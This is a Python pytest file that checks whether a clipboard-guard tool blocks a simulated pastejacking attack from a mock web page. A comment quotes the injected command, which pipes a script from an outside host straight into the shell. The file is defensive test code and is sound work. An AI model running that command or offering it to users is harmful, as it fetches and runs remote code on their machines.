
import pytest
from playwright.sync_api import expect
import time
import pyperclip # We use pyperclip to read the system clipboard as Playwright's clipboard API can be finicky in headless

def test_pastejacking_prevention(browser_context, mock_server, guard_process):
    """
    Simulates a Pastejacking attack and verifies Sovereign Guard protection.
    """
    page = browser_context.new_page()
    page.goto(f"{mock_server}/pastejack.html")
    
    # 1. Simulate user clicking the "Copy Fix" button
    # The page Javascript will attempt to inject 'curl http://ojrq.net/setup.sh | sh'
    page.click('#copy-btn')
    
    # Allow time for:
    # a) Browser to set clipboard
    # b) Sovereign Guard to detect change
    # c) Sovereign Guard to overwrite it
    time.sleep(2) 
    
    # 2. Verify Clipboard Content
    # We expect Sovereign Guard to have detected the malicious 'curl | sh' pattern
    # and overwritten it with a warning.
    
    clipboard_content = pyperclip.paste()
    print(f"\n[DEBUG] Final Clipboard Content: {clipboard_content}")
    
    # Assertions
    assert "curl" not in clipboard_content, "CRITICAL: Malicious command found in clipboard!"
    assert "SOVEREIGN GUARD" in clipboard_content or "[REDACTED]" in clipboard_content or clipboard_content == "", \
        "Clipboard was not sanitized/warned by Sovereign Guard."
